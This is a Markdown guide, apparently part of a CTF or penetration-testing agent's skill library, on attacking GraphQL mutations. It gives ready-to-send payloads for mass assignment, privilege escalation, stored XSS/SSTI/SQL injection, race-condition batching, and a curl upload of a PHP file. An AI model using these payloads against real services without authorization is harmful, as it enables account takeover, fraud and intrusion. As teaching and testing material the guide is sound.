# Mutation abuse — the write surface

Queries read; mutations write — and writes carry the higher-value findings:
privilege changes, state flips, mass assignment, stored injection, second-order
payloads. Everything in `idor-graphql.md` applies doubly here: a mutation that
takes an object id is a write-IDOR; a mutation that takes extra fields is
mass assignment (`skills/web-mass-assignment/`).

---

## 1. The mutation surface checklist

From `data.__schema.mutationType.fields`, classify each mutation:

| Mutation name pattern | First test |
|---|---|
| `create*`, `register*`, `add*` | mass assignment — extra fields in the input object |
| `update*`, `edit*`, `set*`, `change*` | write-IDOR on the id arg + mass assignment |
| `delete*`, `remove*` | write-IDOR; destructive — test on own object only |
| `login`, `authenticate`, `signin` | credential brute-force via aliases; JWT/context bugs |
| `resetPassword`, `forgotPassword` | token-predictable? user-enum? (`web-user-enum`) |
| `verify*`, `confirm*` | OTP brute force via batching |
| `promote*`, `grant*`, `*Role`, `*Permission` | **direct privesc** — the money mutation |
| `upload*`, `import*`, `attach*` | file-upload surface → `skills/web-file-upload/` |
| `exec*`, `run*`, `debug*`, `eval*` | RCE-shaped — probe args as command |
| `invite*`, `share*`, `*collaborator` | access-boundary writes |
| `transfer*`, `payment*`, `checkout*` | logic/race — `skills/web-race-condition/`, `web-logic-flaw` |
| `send*`, `notify*`, `email*` | injection into message body → stored XSS / SSRF via links |
| `*` + `Password`/`Email`/`Username` | account-takeover primitive candidates |

## 2. Mass assignment through input objects

Mutations take `input:` objects. The resolver often does
`Object.assign(user, input)` / `Model.create(input)` — every field the schema
accepts lands on the object:

```graphql
mutation{
  register(input:{
    username:"x", password:"y",
    role:"admin",                 # not in the form, in the schema
    isAdmin:true,
    verified:true,
    balance:99999,
    permissions:["*"]
  }){ id }
}
```

The input *type* may not list `role` — but the server may accept extra keys:

```graphql
# A. declared extra fields — read UserInput type for juicy fields
{__type(name:"RegisterInput"){inputFields{name type{name}}}}

# B. undeclared extra keys — strict servers reject "Field X is not defined";
#    lenient ones pass input through raw
```

Try the declared-privileged fields first (`isAdmin`, `role`, `plan`,
`credits`), then raw extras — Graphene and some Node resolvers pass unknown
input fields through to the model. On REST→GraphQL gateways, input objects
often mirror a JSON body that *does* accept extras.

Mass-assignment field wordlist (send one mutation per candidate — a rejected
key is a free negative):

```text
role isAdmin admin is_staff isSuperuser superuser verified isVerified
plan tier subscription balance credits points score
permissions perms scope groups privileges
approved active enabled disabled banned
email_verified phone_verified mfa mfaEnabled twoFactorEnabled
id ownerId userId createdBy tenantId orgId
```

## 3. Privilege-escalation mutations

The pattern: a `*Role`/`grant`/`promote` mutation exists for admin use but
has no resolver-level check:

```graphql
mutation{ updateUserRole(userId:2, role:"admin"){ id role } }
mutation{ setAdmin(id:2){ ok } }
mutation{ grantPermission(user:"me", perm:"*"){ ok } }
mutation{ promote(userId:2, to:"staff"){ role } }
```

Prove on **your own** account: `updateUserRole(userId:MYID, role:"admin")` —
if `role:"admin"` comes back and admin-only queries now resolve, that is
`confirms --evidence-kind impact`. On a shared instance, demote yourself back
immediately after (`role:"user"`) and record both requests.

## 4. Second-order stored injection

Mutations write data that queries render later — stored XSS/SQLi/SSTI
candidates:

```graphql
mutation{ updateProfile(bio:"<script>alert(1)</script>"){ok} }
mutation{ addComment(text:"{{7*7}}"){id} }
mutation{ createPost(title:"'; DROP--"){id} }
```

Then read the same field through every *other* surface: the web page (XSS —
admin bot challenges: `skills/web-xss/`), a PDF export (SSTI/command), a CSV
export (formula injection), another API consumer. The GraphQL mutation is the
*write* half of a stored bug — the read half is elsewhere.

## 5. Race conditions through mutations

Check-then-act mutations race — coupon redemption, balance transfer, vote:

```graphql
mutation{ redeem(code:"GIFT50"){balance} }     # × N concurrent
mutation{ transfer(to:"x", amount:100){ok} }    # × N concurrent
```

GraphQL-specific multiplier: **aliases inside one document** — some resolvers
execute same-document mutations serially (safe-ish), but array-batched
requests run as concurrent *operations*. Fire one array-batch of N identical
mutation elements — one HTTP request, N concurrent executions:

```json
[{"query":"mutation{redeem(code:\"GIFT50\"){balance}}"},
 {"query":"mutation{redeem(code:\"GIFT50\"){balance}}"},
 {"query":"mutation{redeem(code:\"GIFT50\"){balance}}"}]
```

If three elements each return `balance:+50`, the check-then-act raced. Deep
coverage: `skills/web-race-condition/` — `race_probe.py` drives the overlap
measurement properly.

## 6. Auth-context manipulation

Login mutations establish the context the rest of the attack runs under —
abuse them deliberately:

```graphql
mutation{ login(user:"a",pass:"b"){token user{role}} }
```

- **Token issues**: is the returned token a JWT? → `skills/web-auth-session/`
  + `session_dissect.py`.
- **Context confusion**: does a `logout` mutation invalidate *server-side*
  state, and does an old token still resolve afterwards?
- **Impersonation mutations**: `loginAs`, `impersonate`, `switchUser` — often
  present for support; check if callable without admin.
- **Session mutations**: `createSession`, `refreshToken` — refresh without
  auth is a free session-factory.

## 7. File upload mutations — multipart spec

GraphQL multipart request spec (graphql-multipart-request-spec): mutations
accept `Upload` scalars via multipart/form-data:

```bash
curl -s "$BASE/graphql" \
  -F 'operations={"query":"mutation($f:Upload!){upload(file:$f){url}}","variables":{"f":null}}' \
  -F 'map={"0":["variables.f"]}' \
  -F '0=@/tmp/evil.php;type=application/x-php'
```

The `map` field binds form-file `0` to `variables.f`. Upload surfaces then
follow `skills/web-file-upload/` — extension checks, content sniffing, path
traversal in filename, image-processor command injection. Detail:
`file-upload-graphql.md`.

## 8. The update IDOR + mass-assignment combo

The highest-yield mutation pattern in CTF: `updateUser(id, input)` where

1. `id` selects any user (write-IDOR), and
2. `input` accepts `password` / `role` (mass assignment).

```graphql
mutation{ updateUser(id:1, input:{password:"pwned", role:"admin"}){id role} }
```

One mutation = account takeover. Even when `id` is locked to self, `input`
extras still assign to your own record — `role:"admin"` self-promotion is the
canonical CTF solve (`writeup-techniques.md` card 5's sibling shape).

## 9. Negative results worth recording

| Probe | Negative | Meaning |
|---|---|---|
| extra input key | `Field "role" is not defined by type` | strict input validation — declared fields only |
| `updateUserRole` | `errors: Forbidden` | resolver checks authz — try other mutations |
| array-batch mutation | `Batching is not supported` | serial alias document is the fallback |
| stored payload | reads back escaped | sanitizer in place — different context may still render |

Each is a `post-probe --verdict refutes` — they close branches so the next
agent does not re-walk them.
